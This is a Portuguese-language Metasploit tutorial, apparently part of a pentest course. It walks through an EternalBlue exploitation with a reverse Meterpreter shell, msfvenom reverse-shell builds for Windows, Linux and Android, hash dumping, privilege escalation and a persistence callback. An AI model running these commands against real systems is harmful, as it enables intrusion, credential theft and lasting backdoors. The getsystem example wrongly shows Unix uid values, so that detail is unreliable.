# Metasploit Framework

## Introdução

**Metasploit** é framework profissional para desenvolvimento, teste e execução de exploits.

## Instalação

### Kali Linux
```bash
# Pré-instalado
msfconsole
```

### Ubuntu/Debian
```bash
sudo apt install metasploit-framework

msfconsole
```

---

## Conceitos

### Componentes

- **Exploits**: Código que executa vulnerabilidade
- **Payloads**: Código executado após exploit
- **Encoders**: Criptografia para bypass
- **Nops**: Instruções que não fazem nada
- **Auxiliares**: Ferramentas de reconhecimento

### Fases de Exploit

```
1. Exploração
   ↓
2. Payload
   ↓
3. Session (Shell remota)
```

---

## Uso Básico

### Iniciar Metasploit

```bash
msfconsole

# Resultado
 __  __  ___  _   _  _ ___
|  \/  |/ _ \| \_/ \/ \___ \
|  /\  | | | | | | | ||   \ \
| /  \ | |_| | | | | ||   / /
|/__/\_|\___/|\_/ \_/|_|__/
Version 6.0.0
```

### Comandos Básicos

```bash
help                    # Ajuda
search <termo>          # Buscar exploit
use <exploit>           # Usar exploit
show options            # Mostrar opções
set <opção> <valor>     # Definir opção
run                     # Executar
exploit                 # Alias para run
back                    # Voltar
```

---

## Encontrando Exploits

### Buscar por CVE

```bash
search cve:2017-0144

Resultados:
exploit/windows/smb/ms17_010_eternalblue
exploit/windows/smb/ms17_010_psexec
```

### Buscar por Tipo

```bash
search type:exploit smb

search type:auxiliary scanner

search type:payload shell
```

### Buscar por Plataforma

```bash
search platform:windows

search platform:linux

search platform:android
```

---

## Configurar e Executar Exploit

### Exemplo: EternalBlue

```bash
msfconsole

search ms17-010

use exploit/windows/smb/ms17_010_eternalblue

show options

set RHOSTS 192.168.1.100
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 4444

run

# Resultado
[*] Started reverse TCP handler on 192.168.1.50:4444
[*] Connecting to target...
[+] Connected!
[*] Payload sent
[*] Meterpreter session opened
```

---

## Sessions

### Listar Sessions

```bash
sessions -l

Resultados:
Session 1
  User: SYSTEM
  Host: target
  Payload: meterpreter/reverse_tcp
```

### Interagir com Session

```bash
sessions -i 1

# Agora você tem shell remoto
meterpreter >
```

---

## Meterpreter Shells

### Comandos Úteis

```bash
# Informações
sysinfo                 # Info do sistema
getuid                  # Usuário atual
whoami                  # Nome de usuário

# Sistema de arquivos
ls                      # Listar
cd                      # Navegar
pwd                     # Diretório atual
download arquivo        # Baixar
upload arquivo          # Enviar

# Processo
ps                      # Processos ativos
kill <PID>              # Encerrar processo
getpid                  # PID atual

# Rede
ifconfig                # Configuração de rede
route                   # Tabela de roteamento
```

### Escalação de Privilégios

```bash
getuid
# uid: 1001 (usuário comum)

getsystem

getuid
# uid: 0 (root)
```

---

## Criando Handler

Servidor para receber conexão reversa:

```bash
msfconsole

use multi/handler

set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 4444

run

# Aguardando conexão...
```

---

## Payloads

### Tipos

```
Staged: Pequeno (enviado em 2 partes)
  - windows/meterpreter/reverse_tcp

Inline: Completo (enviado de uma vez)
  - windows/shell_reverse_tcp

Shells
  - windows/shell_reverse_tcp
  - windows/cmd/reverse_tcp

Custom
  - msfvenom (gerar payload)
```

### Gerar Payload com msfvenom

```bash
# Payload Windows EXE
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.50 LPORT=4444 \
  -f exe -o shell.exe

# Payload Linux
msfvenom -p linux/x86/meterpreter/reverse_tcp \
  LHOST=192.168.1.50 LPORT=4444 \
  -f elf -o shell

# Payload Android
msfvenom -p android/meterpreter/reverse_tcp \
  LHOST=192.168.1.50 LPORT=4444 \
  -o shell.apk
```

---

## Módulos Auxiliares

### Scanners

```bash
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.0/24
run

# Resultado
[*] 192.168.1.100 - Detected SMB 3.1.1
```

### Enumeration

```bash
use auxiliary/scanner/snmp/snmp_enum
set RHOSTS 192.168.1.100
run
```

---

## Post-Exploração

### Dumpar Hashes

```bash
# Dentro de meterpreter session
hashdump

# Resultado
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

### Criar Persistência

```bash
run persistence -X -i 60 -p 4444 -r 192.168.1.50

# Vai re-conectar a cada 60 segundos
```

---

## Workflow Típico

```
1. Reconhecimento (Nmap)
   ↓
2. Buscar exploit (search)
   ↓
3. Usar exploit (use)
   ↓
4. Definir opções (set)
   ↓
5. Executar (run)
   ↓
6. Interagir com session (sessions -i)
   ↓
7. Pós-exploração (hashdump, persistence)
   ↓
8. Escalar privilégio (getsystem)
   ↓
9. Documentar (relatório)
```

---

## Boas Práticas

✅ Usar em ambiente autorizado
✅ Documentar tudo
✅ Limpar logs após teste
✅ Reportar vulnerabilidades

❌ Não testar em produção
❌ Não deixar backdoors
❌ Não ignorar logs
❌ Não vender exploits

---

Próximo: Engenharia social com `phishing-kali.md`
